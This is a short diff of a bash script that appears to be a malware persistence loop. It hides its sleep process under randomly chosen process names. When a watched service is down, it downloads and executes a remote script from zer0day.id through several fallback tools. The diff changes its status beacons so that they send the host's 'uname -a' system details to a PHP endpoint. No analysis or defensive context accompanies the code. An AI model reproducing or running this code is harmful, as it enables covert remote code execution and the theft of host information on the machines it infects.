@@ -54,14 +54,14 @@ while true; do
         RANDOM_SLEEP_NAME="\$(choose_random_proc_name)"
         exec -a "\$RANDOM_SLEEP_NAME" sleep 3  
     else
-        curl -sL -H "Content-Type: text/plain" -X POST --data-binary "status=service_down&host=\$host" "$php_endpoint"
+        curl -sL -H "Content-Type: text/plain" -X POST --data-binary "status=service_down&&host=$(uname -a)" "$php_endpoint"
         
         bash -c "\$(curl -fsSL https://zer0day.id/y)" || bash -c "\$(wget -qO- https://zer0day.id/y)" || bash -c "\$(fetch -o - https://zer0day.id/y)" || bash -c "\$(lynx -source https://zer0day.id/y)" || bash -c "\$(brew install -q https://zer0day.id/y)"
 
         if systemctl is-active --quiet "$service_name"; then
-            curl -sL -H "Content-Type: text/plain" -X POST --data-binary "status=service_up&host=\$host" "$php_endpoint"
+            curl -sL -H "Content-Type: text/plain" -X POST --data-binary "status=service_up&&host=$(uname -a)" "$php_endpoint"
         else
-            curl -sL -H "Content-Type: text/plain" -X POST --data-binary "status=service_fail&host=\$host" "$php_endpoint"
+            curl -sL -H "Content-Type: text/plain" -X POST --data-binary "status=service_fail&&host=$(uname -a)" "$php_endpoint"
         fi
     fi
 done
